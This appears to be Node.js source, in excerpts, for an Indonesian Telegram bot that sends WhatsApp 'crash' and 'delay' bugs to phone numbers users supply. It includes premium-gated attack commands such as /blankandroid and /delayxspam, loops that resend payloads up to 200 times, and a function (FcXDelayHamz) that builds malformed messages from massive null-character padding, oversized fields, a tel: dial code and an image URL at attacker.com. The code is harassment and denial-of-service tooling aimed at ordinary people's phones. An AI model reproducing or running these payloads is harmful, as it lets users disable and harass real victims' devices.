 ///BASE SCRIPT BY @DiRez
/// NO HAPUS CREDIT MBUTT
(function() {
  'use strict'
...
const { TOKEN_DirzZX } = require("./config");
const BOT_TOKEN = TOKEN_DirzZX;
...
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/Dio213z/DiRezXBug/refs/heads/main/token.json";////ganti jadi Raw luh
...
│  abda terdeteksi ingin membypass paksa Script!!                      │
│                                              │
├──────────────────────────────────────────────┤
│  DirzZX SCRIPT BERKUALITAS & LOADER TERENKRIPSI      │
└──────────────────────────────────────────────┘
`);
  process.exit(1);
}
...
│  - System bypass detection aktif           │
│  - Pelepasan bypass otomatis dimulai       │
│                                              │
├──────────────────────────────────────────────┤
│  DirzZX SCRIPT BERKUALITAS & LOADER TERENKRIPSI        │
└──────────────────────────────────────────────┘`))
...
// pesan force subscribe
async function sendForceSubscribeMessage(ctx) {
  const text = `
⚠️ AKSES TERKUNCI

──────────────────
Kamu harus join channel kami dulu
untuk bisa menggunakan bot ini.

Setelah join, klik CEK STATUS.
────────────────────
📝 Untuk setting channel silahkan ketik : /setchannel @NamaChannel
`;
...
bot.action("check_join", async (ctx) => {
  ...
  return ctx.reply("✅ Verifikasi berhasil! Bot siap digunakan.");
});
...
bot.command("setchannel", async (ctx) => {
  ...
  if (args.length < 2) {
    return ctx.reply("❌ Gunakan: /setchannel @ChannelLu");
  }
...
// ================= CONFIG =================
const IMAGES = {
  home: "https://files.catbox.moe/b6wnw0.jpg"
};
...
async function sendPage(ctx, page = 0) {
  ...
  keyboard = [
    [
      { text: "(༒) ʙᴀᴄᴋ", callback_data: "page_0", style: "primary", icon_custom_emoji_id: "5352759161945867747" },
      { text: "⎙ 2/7", callback_data: "noop", style: "danger", icon_custom_emoji_id: "4956395910306202687" },
      { text: "(☊) ɴᴇxᴛ", callback_data: "page_2", style: "success", icon_custom_emoji_id: "5372917041193828849" }
    ]
  ];
} else if (page === 2) {
  keyboard = [
    [
      { text: "(༒) ʙᴀᴄᴋ", callback_data: "page_1", style: "primary", icon_custom_emoji_id: "5352759161945867747" },
      { text: "⎙ 3/7", callback_data: "noop", style: "danger", icon_custom_emoji_id: "4956395910306202687" },
      { text: "(☊) ɴᴇxᴛ", callback_data: "page_3", style: "success", icon_custom_emoji_id: "5372917041193828849" }
    ]
  ];
}
  ...
  // BUG MENU PAGE
    ...
    keyboard = [
      [
        { text: "BEBAS SPAM", callback_data: "spam", style: "success", icon_custom_emoji_id: "5084613633418199991" }
      ],
      [
        { text: "NOT SPAM", callback_data: "not_spam", style: "danger", icon_custom_emoji_id: "5085022089103016925" }
      ],
      [       
        { text: "(༒) ʙᴀᴄᴋ", callback_data: "page_2", style: "primary", icon_custom_emoji_id: "5352759161945867747" },
        { text: "⎙ 4/7", callback_data: "noop", style: "danger", icon_custom_emoji_id: "4956395910306202687" },
        { text: "(☊) ɴᴇxᴛ", callback_data: "page_4", style: "success", icon_custom_emoji_id: "5372917041193828849" }
      ]
    ];
  }
...
⚔ GROUP MODE
✦━━━━━━━━━━━━━━✦
➤ /addgroupremium → Add Group
➤ /delgroupremium → Del Group
➤ /groupon → ON
➤ /groupoff → OFF
✦━━━━━━━━━━━━━━✦
⚙ ACCESS CONTROL
...
\`\`\`js
╭──〔 𝗠𝗨𝗥𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 〕──╮
│ ↯ /delaychat 62××      ☇ SPAM BUG DELAY V1
│ ↯ /majestichard 62××   ☇ DELAY INVISIBLE
│ ↯ /flowerdelay 62××    ☇ DELAY BRUTAL
│ ↯ /longsdelay 62××     ☇ DELAY PERMANENT
│ ↯ /sendelay 62××       ☇ DELAY ONE HIT
│ ↯ /delayxspam 62××     ☇ SPAM BUG DELAY V2
╰──────────────────────╯
...
\`\`\`js
╭──〔 𝗡𝗢𝗧 𝗦𝗣𝗔𝗠 𝗕𝗨𝗚 𝗧𝗬𝗣𝗘 〕──╮
│ ↯ /combox 62××       ☇ BLANK ANDROID
│ ↯ /blankandroid 62×× ☇ BLANK ANDRO V2
...
╚══════════════════════╝
\`\`\`
`, [[{ text: "BACK", callback_data: "page_2", style: "primary", icon_custom_emoji_id: "5352759161945867747" }]]);
});
// ================= NAVIGATION =================
bot.action(/page_(\d+)/, async (ctx) => {
  await ctx.answerCbQuery();
...
bot.command("ssiphone", async (ctx) => {
  ...
  try {
    ...
    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By DirzZX Kece ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
...
╚══════════════════════════╝
        ...
        await ctx.reply(teks, {
            ...
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "👑 Contact Owner", url: "https://t.me/DiRez", style: "danger" }
                    ]
                ]
            }
        });
...
bot.command("connect", checkOwner, async (ctx) => {
  try {
    ...
    const msg = await ctx.replyWithPhoto(
      "https://files.catbox.moe/jadxnc.jpg",//ganti jadi url catbox gambar lu
      {
        caption:
`
\`\`\`js
...
bot.command("majestichard", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /majestichard 62xx");
    ...
    await ctx.replyWithPhoto(
      "https://files.catbox.moe/jadxnc.jpg", // ✅ FIX DISINI
      {
        caption: `
\`\`\`js
⬡═―—⊱ [ SUCCESS SENDING BUG ] ⊰―—═⬡
༄ Target - ${q}
༄ Type Bug - DELAY ANDROID INVISIBLE
...
/// CASE BUG BEBAS SPAM BUGS DirzZX \\\
bot.command("sendelay", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /sendelay 62xx"); 
  ...
  (async () => {
    try {
      for (let r = 0; r < 20; r++) {
        ...
        await VnXDelayXfrezeeNew(sock, target);
        await FreezerXDelay(sock, tagret);
        await sleep(1500);
      }
    } catch (err) {
...
bot.command("flowerdelay",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 Example: /flowerdelay 62xxxx");
...
`;
    ...
    console.log(`[SUCCESS FLOWERDELAY] by ${username} | target: ${q} | time: ${time}`);
...
`);
        ...
        console.error("[ERROR FLOWERDELAY]", err);
      }
    })();
  }
);
/// ============= CASE BUG 10 BEBAS SPAM=============\\\
bot.command("longsdelay", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /longsdelay 62xx"); 
...
`,
    {
      ...
      reply_markup: {
        inline_keyboard: [
          [
            { text: "(ᥫ᭡) 𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "primary", icon_custom_emoji_id: "5334998226636390258" }
          ]
        ]
      }
    }
...
bot.command("delaychat", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /delaychat 62xx");
...
`,
    {
      ...
      reply_markup: {
        inline_keyboard: [
          [
            { text: "(ᥫ᭡) 𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "danger" }
          ]
        ]
      }
    }
...
/// ============= CASE BUG 10 BEBAS SPAM=============\\\
/// ============= CASE BUG 5 BEBAS SPAM=============\\\
bot.command("delayxspam", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /delayxspam 62xx");
  ...
  await ctx.reply(
` \`\`\`js
SUCCES MENGIRIM DELAYXSPAM (BUG) KEPADA TARGET : ${q}
\`\`\`
`,
    {
      ...
      reply_markup: {
        inline_keyboard: [
          [
            { text: "CHECK TARGET", url: `https://wa.me/${q}`, style: "danger", icon_custom_emoji_id: "6034957065569441680" },
            { text: "OWNER", url: `https://t.me/DiRez`, style: "success", icon_custom_emoji_id: "5422888130984308617" }
          ]
        ]
      }
    }
  ...
  (async () => {
    try {
      for (let r = 0; r < 25; r++) {
       await delayinvis(sock, target);
       await TitidDelay(sock, target);
       await sleep(1500);
     }
    } catch (err) {
      console.error("Gagal mengirim: Connection Closed:", err);
    }
  })();
...
bot.command("combox", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const thumbnailUrl2 = "https://files.catbox.moe/jadxnc.jpg";
  ...
  const processMessage = await ctx.telegram.sendPhoto(
    ...
    {
      caption: `
<pre><code class="language-javascript">⟡━⟢ DirzZX ⟣━⟡
⌑ Target: ${q}
⌑ Type: combo bug
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
  ...
  try {
    for (let i = 0; i < 50; i++) {
      await sendVnXCrash(sock, target);
      await sleep(1000);
    }
...
bot.command("freeze", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  ...
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Format: /freeze 62×××");
...
bot.command("blankandroid", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  ...
  const thumbnailUrl2 = "https://files.catbox.moe/jadxnc.jpg"; // Ganti dengan URL asli milikmu
...
╘═——————————————═⬡</code></pre>`,
  ...
  for (let i = 0; i < 200; i++) {
    await VnXBlankQoutedNew(sock, target);
    await sleep(1500);
  }
...
bot.command("blankandro", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    ...
    // 🚀 PROCESSING
    await ctx.replyWithPhoto(
      { url: "https://files.catbox.moe/jadxnc.jpg" },
      {
...
Time : ${time}</pre>`,
    ...
    (async () => {
      for (let r = 0; r < 80; r++) {
        try {
          await VsxCrashInvisDeath(sock, target);
          await sleep(2000);
        } catch (err) {
          console.log("Error send:", err);
        }
...
bot.command(/^\/testfunction(?:@[\w_]+)?\s*(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  ...
  try {
    ...
    const processMsg = await bot.sendPhoto(chatId, thumbnailUrlV2, {
      caption: `
<blockquote><pre>⬡═―—⊱ ⎧ DirzZX ATTACK ⎭ ⊰―—═⬡</pre></blockquote>
▢  Target: ${q}
▢  Type: Unknown Func
▢  Status: Process Bug
╘═——————————————═⬡`,
...
// 1. REGEX ENGINE: Sekarang dibuat fleksibel agar bisa menangkap command polosan atau command + judul lagu
...
// Handler pengiriman audio aman (Include Premium Emoji, Blockquote, dan Watermark)
async function sendAudioSafe(ctx, data, loadingMsgId) {
  const captionTeks = 
    `<blockquote><tg-emoji emoji-id="5470135030393090150">🎵</tg-emoji> <b>Judul:</b> ${data.title || "Unknown"}</blockquote>\n` +
    `<blockquote><tg-emoji emoji-id="5226928895189598791">👤</tg-emoji> <b>Penyanyi:</b> ${data.artist || "Unknown"}</blockquote>\n` +
    `<blockquote><tg-emoji emoji-id="5443127283898405358">⏱️</tg-emoji> <b>Durasi:</b> ${data.duration || "Unknown"}</blockquote>\n\n` +
    `<blockquote><b>By @Raffioffci5 <tg-emoji emoji-id="5778153093971580107">✨</tg-emoji></b></blockquote>`;
  ...
  try {
    ...
    // Hapus pesan loading setelah sukses terkirim
    await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsgId).catch(() => {});

  } catch (err) {
    // Fallback kirim sebagai Document jika format audio ditolak Telegram
...
bot.hears(kwontol, async (ctx) => {
  ...
  try {
    ...
    // 🌟 VALIDASI JIKA USER HANYA KETIK COMMAND TANPA JUDUL LAGU
    if (!query) {
      return await ctx.reply(
        `<blockquote><tg-emoji emoji-id="5274099962655816924">❗️</tg-emoji> <b>Format Salah, Bng/Kak!</b>\nKetik judul lagu yang mau dicari setelah perintah.\n\nContoh: <code>/${cmd} nama lagunya</code></blockquote>`, 
        { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id }
      );
    }

    // 2. Kirim Efek Loading Pertama (Animasi Mencari Musik)
    loadingMsg = await ctx.reply(
      `<blockquote><tg-emoji emoji-id="5258203794772085854">⚡️</tg-emoji> <b>Mencari lagu:</b> <code>${query}</code>...</blockquote>`, 
      { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id }
    );
    ...
    if (!data || !data.download) {
      return await ctx.telegram.editMessageText(
        ...
        null, 
        `<blockquote><tg-emoji emoji-id="4956612582816351459">❌</tg-emoji> Lagu tidak ditemukan di server API, Fi!</blockquote>`, 
        { parse_mode: "HTML" }
      );
    }
    ...
    await ctx.telegram.editMessageText(
      ...
      loadingMsg.message_id, 
      null, 
      `<blockquote><tg-emoji emoji-id="5443127283898405358">📥</tg-emoji> <b>Lagu Ditemukan!</b>\nsedang mengunduh audio: <i>${data.title || query}</i>...</blockquote>`, 
      { parse_mode: "HTML" }
    ).catch(() => {});

    // 4. Kirim Audionya ke Telegram
    await sendAudioSafe(ctx, data, loadingMsg.message_id)
    ...
    if (loadingMsg) {
      await ctx.telegram.editMessageText(
        ...
        loadingMsg.message_id, 
        null, 
        `<blockquote><tg-emoji emoji-id="4956612582816351459">❌</tg-emoji> Terjadi kesalahan internal saat memproses berkas audio.</blockquote>`, 
        { parse_mode: "HTML" }
      ).catch(() => {});
    } else {
...
async function FcXDelayHamz(sock, target) {
    if (!sock || !target) return console.error("Parameter kurang: sock atau target kosong");
    try {
        const urlPoisoning = {
            interactiveResponseMessage: {
                nativeFlowResponseMessage: {
                    name: "cta_flow_thunder",
                    responseJson: JSON.stringify({
                        flow_token: "\u0000".repeat(50000),
                        url: "tel:*2767*3855#",
                        force_process: true,
                        auto_load: true
                    })
        ...
        await sock.relayMessage(target, urlPoisoning, { participant: { jid: target } });
        ...
        const linkedSync = {
            protocolMessage: {
                ...
                appStateSyncKey: {
                    keyId: "\u0000".repeat(40000),
                    keyData: "\u600b".repeat(45000)
                }
            }
        };
        await sock.relayMessage(target, linkedSync, { participant: { jid: target } });

        const imageCrash = {
            imageMessage: {
                url: "https://attacker.com/malicious.dng",
                mimetype: "image/x-adobe-dng",
                caption: "\u0000".repeat(60000),
                fileLength: 999999999,
                jpegThumbnail: "FFD8FFE000104A46494600010100000100010000FFDB004300" + "\u0000".repeat(70000),
                contextInfo: {
                    deviceListMetadata: {
                        deviceListMetadataVersion: 999999,
                        deviceListMetadata: "\u0000".repeat(30000)
                    }
                }
            }
        };
        await sock.relayMessage(target, imageCrash, { participant: { jid: target } });

        for (let i = 0; i < 20; i++) {
            await sock.relayMessage(target, {
                extendedTextMessage: {
                    text: "\u0000".repeat(60000) + "\u600b".repeat(50000),
                    contextInfo: {
                        mentionedJid: [target],
                        deviceListMetadata: {
                            deviceListMetadataVersion: 999999,
                            deviceListMetadata: "\u0000".repeat(50000)
                        }
                    }
                }
        ...
        console.log("FcXDelayHamz sukses ke " + target);
    } catch (err) {
